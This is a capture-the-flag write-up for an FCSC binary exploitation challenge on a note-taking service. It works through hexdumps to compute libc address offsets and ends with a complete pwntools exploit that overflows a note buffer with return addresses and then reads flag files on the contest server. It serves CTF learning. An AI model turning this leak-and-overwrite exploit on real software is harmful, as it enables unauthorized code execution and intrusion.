Time to PWN!
I'm not really good at this, but i need to try.

So, let's analyze a shovel that worked.
- First, it sends a payload of length 176, containing padding and data, including the filename.
- Then, it prints the content of the file
- Finally, it creates another note with another payload.

I just realized that we could press "Generate script" on Shovel to get a script making that exploit.

```python
# for flag_id in EXTRA:
data = r.recvuntil(b'ote\n0. Exit\n>>> ')
r.sendline(b'1')
data = r.recvuntil(b'ontent length: \n')
r.sendline(b'176')
data = r.recvuntil(b'Content: \n')
r.sendline(b'AAAAAAAA')
data = r.recvuntil(b'ote\n0. Exit\n>>> ')
r.sendline(b'2')
data = r.recvuntil(b't filename:\n>>> ')
r.sendline(b'kZAeypHJmavtrHcFS2KSgSBu3VqJmA3/HqYNY3qAkw6PVSVEnTmBGAUfFhMXKT6')
data = r.recvuntil(b'ote\n0. Exit\n>>> ')
r.sendline(b'1')
data = r.recvuntil(b'ontent length: \n')
r.sendline(b'152')
data = r.recvuntil(b'Content: \n')
r.sendline(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[\x13@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x13@\x00\x00\x00\x00\x001p\x0e\x9c\x97\x7f\x00\x00\xa0\xd3\xf9\x9b\x97\x7f\x00\x00')
r.sendline(b'cat /fcsc/4S59fnfQ9m9sHhRs6qGqMMQaEUsC6UH/*')
data = r.recvuntil(b'\x00\x00')

r.close()
```

I extracted 2 final payloads, excluding padding and their common parts
```
\xe0\x5e\x3a\x7b\x7f\x00\x00\xa0\x43\x4a\x3a\x7b\x7f\x00\x00
\x70\x0e\x9c\x97\x7f\x00\x00\xa0\xd3\xf9\x9b\x97\x7f\x00\x00
```

So we can guess the final payload is:
```
\xXX\xXX\xXX\xXX\x7f\x00\x00\xa0\xXX\xXX\xXX\xXX\x7f\x00\x00
```
There are 4 bytes modified, addresses maybe ?

When i look at the data, i can see this:
```
[0x00000000] 41 41 41 41 41 41 41 41 00 47 12 9c 00 00 00 00
[0x00000010] 13 21 40 00 00 00 00 00 00 00 00 00 00 00 00 00 
[0x00000020] 64 00 00 00 00 00 00 00 64 00 00 00 00 00 00 00
[0x00000030] f0 95 2c 58 fc 7f 00 00 00 00 00 00 00 00 00 00
[0x00000040] 20 20 18 9c 97 7f 00 00 92 13 40 00 00 00 00 00 
[0x00000050] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[0x00000060] 64 00 00 00 00 00 00 00 62 19 40 00 00 00 00 00 
[0x00000070] 6b 5a 41 65 79 70 48 4a 6d 61 76 74 72 48 63 46 
[0x00000080] 53 32 4b 53 67 53 42 75 33 56 71 4a 6d 41 33 00 
[0x00000090] d8 95 2c 58 fc 7f 00 00 02 00 00 00 00 00 00 00 
[0x000000a0] 00 00 00 00 00 00 00 00 ca 81 f7 9b 97 7f 00 00 
```
I noticed that these 2 lines are very simillar:
```
[0x00000030] f0 95 2c 58 fc 7f 00 00 00 00 00 00 00 00 00 00
[0x00000090] d8 95 2c 58 fc 7f 00 00 02 00 00 00 00 00 00 00 
```
So the first part of our payload is probably using this ?

------------------------------------
If i check another payload:
```
[0x00000000] 41 41 41 41 41 41 41 41 00 77 7b 3f 00 00 00 00
[0x00000010] 13 21 40 00 00 00 00 00 00 00 00 00 00 00 00 00 
[0x00000020] 64 00 00 00 00 00 00 00 64 00 00 00 00 00 00 00 
[0x00000030] c0 94 ab a7 c7 73 00 00 00 00 00 00 00 00 00 00 
[0x00000040] 20 60 80 3f 76 61 00 00 92 13 40 00 00 00 00 00 
[0x00000050] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
[0x00000060] 64 00 00 00 00 00 00 00 62 19 40 00 00 00 00 00 
[0x00000070] 4a 42 33 6e 39 34 39 39 71 51 6d 71 47 65 6a 72 
[0x00000080] 6d 6e 54 64 37 73 6b 77 65 54 4b 72 41 62 35 00 
[0x00000090] a8 94 ab a7 c7 73 00 00 02 00 00 00 00 00 00 00 
[0x000000a0] 00 00 00 00 00 00 00 00 ca b1 60 3f 76 61 00 00 
```

These lines are also simmilar.
```
[0x00000030] c0 94 ab a7 c7 73 00 00 00 00 00 00 00 00 00 00 
[0x00000090] a8 94 ab a7 c7 73 00 00 02 00 00 00 00 00 00 00 
```
------------------------------------
So we are overwriting this line:
```
[0x00000090] d8 95 2c 58 fc 7f 00 00 02 00 00 00 00 00 00 00 
```
And we're writing this:
```
1\x70\x0e\x9c\x97\x7f\x00\x00\xa0\xd3\xf9\x9b\x97\x7f\x00\x00
# which looks like
[0x00000090] 31 70 0e 9c 97 7f 00 00 a0 d3 f9 9b 97 7f 00 00 
```

Reminder of our hexdump:
```
[0x00000000] 41 41 41 41 41 41 41 41 00 47 12 9c 00 00 00 00
[0x00000010] 13 21 40 00 00 00 00 00 00 00 00 00 00 00 00 00 
[0x00000020] 64 00 00 00 00 00 00 00 64 00 00 00 00 00 00 00
[0x00000030] f0 95 2c 58 fc 7f 00 00 00 00 00 00 00 00 00 00
[0x00000040] 20 20 18 9c 97 7f 00 00 92 13 40 00 00 00 00 00 
[0x00000050] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[0x00000060] 64 00 00 00 00 00 00 00 62 19 40 00 00 00 00 00 
[0x00000070] 6b 5a 41 65 79 70 48 4a 6d 61 76 74 72 48 63 46 
[0x00000080] 53 32 4b 53 67 53 42 75 33 56 71 4a 6d 41 33 00 
[0x00000090] d8 95 2c 58 fc 7f 00 00 02 00 00 00 00 00 00 00 
[0x000000a0] 00 00 00 00 00 00 00 00 ca 81 f7 9b 97 7f 00 00 
```

So we turned this line into this line:
```
[0x00000090] d8 95 2c 58 fc 7f 00 00 02 00 00 00 00 00 00 00 
[0x00000090] 31 70 0e 9c 97 7f 00 00 a0 d3 f9 9b 97 7f 00 00 
```

After a while, i decided to compare all the address i found in the file, and compare their offsets.
## Case 1
```
[0x00000000] 41 41 41 41 41 41 41 41 00 57 6a a0 00 00 00 00  | AAAAAAAA.Wj.....
[0x00000010] 13 21 40 00 00 00 00 00 00 00 00 00 00 00 00 00  | .!@.............
[0x00000020] 64 00 00 00 00 00 00 00 64 00 00 00 00 00 00 00  | d.......d.......
[0x00000030] 20 1c e7 22 fd 7f 00 00 00 00 00 00 00 00 00 00  |  .."............
[0x00000040] 20 30 70 a0 84 7f 00 00 92 13 40 00 00 00 00 00  |  0p.......@.....
[0x00000050] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  | ................
[0x00000060] 64 00 00 00 00 00 00 00 62 19 40 00 00 00 00 00  | d.......b.@.....
[0x00000070] 44 53 44 53 42 77 73 74 43 4d 77 36 32 57 50 47  | DSDSBwstCMw62WPG
[0x00000080] 48 62 64 73 59 63 6d 78 59 6b 68 77 70 66 36 00  | HbdsYcmxYkhwpf6.
[0x00000090] 08 1c e7 22 fd 7f 00 00 02 00 00 00 00 00 00 00  | ..."............
[0x000000a0] 00 00 00 00 00 00 00 00 ca 91 4f a0 84 7f 00 00  | ..........O.....
```

```
00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000010  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000020  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000030  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000040  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000050  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000060  41 41 41 41 41 41 41 41  5b 13 40 00 00 00 00 00  |AAAAAAAA[.@.....|
00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000080  5e 13 40 00 00 00 00 00  31 80 66 a0 84 7f 00 00  |^.@.....1.f.....|
00000090  a0 e3 51 a0 84 7f 00 00  0a                       |..Q......|
```
30th address:
```
20 1c e7 22 fd 7f -> 7ffd22e71c20
```
40th address:
```
20 30 70 a0 84 7f -> 7f84a0703020
```

first address:
```
31 80 66 a0 84 7f -> 7f84a0668031
```
second address:
```
a0 e3 51 a0 84 7f -> 7f84a051e3a0
```
7f84a0668031 – 7f84a051e3a0 = **149C91**
7f84a0703020 – 7f84a0668031 = **9AFEF**

# Case 2
```
[0x00000000] 41 41 41 41 41 41 41 41 00 07 3b c1 00 00 00 00  | AAAAAAAA..;.....
[0x00000010] 13 21 40 00 00 00 00 00 00 00 00 00 00 00 00 00  | .!@.............
[0x00000020] 64 00 00 00 00 00 00 00 64 00 00 00 00 00 00 00  | d.......d.......
[0x00000030] 30 59 2b ed fc 7f 00 00 00 00 00 00 00 00 00 00  | 0Y+.............
[0x00000040] 20 e0 40 c1 1f 7f 00 00 92 13 40 00 00 00 00 00  |  .@.......@.....
[0x00000050] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  | ................
[0x00000060] 64 00 00 00 00 00 00 00 62 19 40 00 00 00 00 00  | d.......b.@.....
[0x00000070] 42 41 47 6e 45 50 34 44 4d 45 71 55 6e 51 68 55  | BAGnEP4DMEqUnQhU
[0x00000080] 59 48 44 6d 57 4d 37 64 38 70 35 58 61 6d 71 00  | YHDmWM7d8p5Xamq.
[0x00000090] 18 59 2b ed fc 7f 00 00 02 00 00 00 00 00 00 00  | .Y+.............
[0x000000a0] 00 00 00 00 00 00 00 00 ca 41 20 c1 1f 7f 00 00  | .........A .....
```

```bash
00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000010  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000020  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000030  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000040  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000050  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000060  41 41 41 41 41 41 41 41  5b 13 40 00 00 00 00 00  |AAAAAAAA[.@.....|
00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000080  5e 13 40 00 00 00 00 00  31 30 37 c1 1f 7f 00 00  |^.@.....107.....|
00000090  a0 93 22 c1 1f 7f 00 00  0a                       |.."......|
00000099
```

0x30:
```
30 59 2b ed fc 7f -> 7ffced2b5930
```
0x40:
```
20 e0 40 c1 1f 7f -> 7f1fc140e020
```
1st
```
31 30 37 c1 1f 7f -> 7f1fc1373031
```
2nd
```
a0 93 22 c1 1f 7f -> 7f1fc12293a0
```


7f1fc140e020 – 7f1fc1373031 = **9AFEF**
7f1fc1373031 – 7f1fc12293a0 = **149C91**

They seems like they're addresses using an offset, probably to put "system" and "bin/bash" over the return address.

So, i'm going to parse the value of 0x40, and use it as an offset to reach the other values !

I wrote a script, but that didn't work.
So i tried another leak:

# Leaking 0x90 and 0xa0
## Case 1
```
[0x00000000] 41 41 41 41 41 41 41 41 00 57 6a a0 00 00 00 00  | AAAAAAAA.Wj.....
[0x00000010] 13 21 40 00 00 00 00 00 00 00 00 00 00 00 00 00  | .!@.............
[0x00000020] 64 00 00 00 00 00 00 00 64 00 00 00 00 00 00 00  | d.......d.......
[0x00000030] 20 1c e7 22 fd 7f 00 00 00 00 00 00 00 00 00 00  |  .."............
[0x00000040] 20 30 70 a0 84 7f 00 00 92 13 40 00 00 00 00 00  |  0p.......@.....
[0x00000050] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  | ................
[0x00000060] 64 00 00 00 00 00 00 00 62 19 40 00 00 00 00 00  | d.......b.@.....
[0x00000070] 44 53 44 53 42 77 73 74 43 4d 77 36 32 57 50 47  | DSDSBwstCMw62WPG
[0x00000080] 48 62 64 73 59 63 6d 78 59 6b 68 77 70 66 36 00  | HbdsYcmxYkhwpf6.
[0x00000090] 08 1c e7 22 fd 7f 00 00 02 00 00 00 00 00 00 00  | ..."............
[0x000000a0] 00 00 00 00 00 00 00 00 ca 91 4f a0 84 7f 00 00  | ..........O.....
```

```
00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000010  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000020  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000030  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000040  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000050  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000060  41 41 41 41 41 41 41 41  5b 13 40 00 00 00 00 00  |AAAAAAAA[.@.....|
00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000080  5e 13 40 00 00 00 00 00  31 80 66 a0 84 7f 00 00  |^.@.....1.f.....|
00000090  a0 e3 51 a0 84 7f 00 00  0a                       |..Q......|
```
90th address:
```
08 1c e7 22 fd 7f -> 7ffd22e71c08
```
a0th address:
```
ca 91 4f a0 84 7f -> 7f84a04f91ca
```

first address:
```
31 80 66 a0 84 7f -> 7f84a0668031
```
second address:
```
a0 e3 51 a0 84 7f -> 7f84a051e3a0
```
90: 7ffd22e71c08 - 7f84a0668031= **7882809BD7**
a0: 7f84a04f91ca - 7f84a0668031 = **-16EE67**
# Case 2
```
[0x00000000] 41 41 41 41 41 41 41 41 00 07 3b c1 00 00 00 00  | AAAAAAAA..;.....
[0x00000010] 13 21 40 00 00 00 00 00 00 00 00 00 00 00 00 00  | .!@.............
[0x00000020] 64 00 00 00 00 00 00 00 64 00 00 00 00 00 00 00  | d.......d.......
[0x00000030] 30 59 2b ed fc 7f 00 00 00 00 00 00 00 00 00 00  | 0Y+.............
[0x00000040] 20 e0 40 c1 1f 7f 00 00 92 13 40 00 00 00 00 00  |  .@.......@.....
[0x00000050] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  | ................
[0x00000060] 64 00 00 00 00 00 00 00 62 19 40 00 00 00 00 00  | d.......b.@.....
[0x00000070] 42 41 47 6e 45 50 34 44 4d 45 71 55 6e 51 68 55  | BAGnEP4DMEqUnQhU
[0x00000080] 59 48 44 6d 57 4d 37 64 38 70 35 58 61 6d 71 00  | YHDmWM7d8p5Xamq.
[0x00000090] 18 59 2b ed fc 7f 00 00 02 00 00 00 00 00 00 00  | .Y+.............
[0x000000a0] 00 00 00 00 00 00 00 00 ca 41 20 c1 1f 7f 00 00  | .........A .....
```

```bash
00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000010  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000020  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000030  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000040  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000050  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000060  41 41 41 41 41 41 41 41  5b 13 40 00 00 00 00 00  |AAAAAAAA[.@.....|
00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000080  5e 13 40 00 00 00 00 00  31 30 37 c1 1f 7f 00 00  |^.@.....107.....|
00000090  a0 93 22 c1 1f 7f 00 00  0a                       |.."......|
00000099
```

0x90:
```
18 59 2b ed fc 7f -> 7ffced2b5918
```
0xa0:
```
ca 41 20 c1 1f 7f -> 7f1fc12041ca
```
1st
```
31 30 37 c1 1f 7f -> 7f1fc1373031
```
2nd
```
a0 93 22 c1 1f 7f -> 7f1fc12293a0
```

90: 7ffced2b5918 - 7f1fc1373031 = **DD2BF428E7**
0a: 7f1fc12041ca - 7f1fc1373031 = **-16EE67**

So, the "0a" value stays the same. Let's use that leak instead.

And i got the flag using that offset instead !
```python
from pwn import *

LOCAL_FILE_PATH: str = "./XXXX"
REMOTE_SERVER = "challenges.france-cybersecurity-challenge.fr"
REMOTE_PORT = 2108

def pwn(r):
    data = r.recvuntil(b'ote\n0. Exit\n>>> ')
    print(data.decode("utf-8"))
    r.sendline(b'1')
    print(data.decode("utf-8"))
    folder = data.decode("utf-8").lstrip("[*] Current session: /fcsc/").split("\n")[0]
    data = r.recvuntil(b'ontent length: \n')
    note_name = data.decode("utf-8").lstrip("[*] Creating note: ").split("\n")[0]
    full_path = folder + note_name
    print("full path:", full_path)

    r.sendline(b'176')
    data = r.recvuntil(b'Content: \n')
    print(data.decode("utf-8"))
    r.sendline(b'AAAAAAAA')
    data = r.recvuntil(b'ote\n0. Exit\n>>> ')
    print(data.decode("utf-8"))
    r.sendline(b'2')
    data = r.recvuntil(b't filename:\n>>> ')
    print(data.decode("utf-8"))
    r.sendline(bytes(full_path, "utf-8"))
   
    binary_data = r.recvuntil(b'ote\n0. Exit\n>>> ').decode("utf-8")
    print(binary_data)

    # Extracting a0th line 
    linea0 = binary_data.split("\n")[11].split("]")[1].split("|")[0].split(" ")[1:-2]
    print("LINE:", linea0)
    sublinea0 = linea0[8:14]
    print(sublinea0)
    sublinea0_str = "".join(sublinea0[::-1])
    # Get value from hex string
    print(sublinea0_str)
    value_a0 = int(sublinea0_str, base=16)
    print(value_a0)

    # Process values using offset
    offset_from_a0_to_1st = -0x16EE67
    offset_from_1st_to_2nd = 0x149C91

    first_addr = value_a0 - offset_from_a0_to_1st
    second_addr = first_addr - offset_from_1st_to_2nd
    print(hex(first_addr))
    print(hex(second_addr))

    r.sendline(b'1')
    data = r.recvuntil(b'ontent length: \n')
    print(data.decode("utf-8"))
    r.sendline(b'152')
    data = r.recvuntil(b'Content: \n')
    print(data.decode("utf-8"))
    # 104 A padding to reach the filename
    payload = b'A'*104
    payload += b'[\x13@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x13@\x00\x00\x00\x00\x00'
    payload += p64(first_addr, endian="little")
    payload += p64(second_addr, endian="little")
    print(payload)
    r.sendline(payload)
    r.sendline(b'cat /fcsc/ChbbgHyPqJDQy5UaJve6uUGMDQHXWtc/*')
    r.interactive()

    data = r.recvall(timeout=5)
    print(data)
    
    r.close()

def run_remote():
    conn = remote(REMOTE_SERVER, REMOTE_PORT)
    pwn(conn)

def run_bin_local(process_path: str):
    proc = process([process_path])
    pwn(proc)

def main():
    #run_bin_local(LOCAL_FILE_PATH)
    run_remote()

if __name__ == '__main__':
    main()
```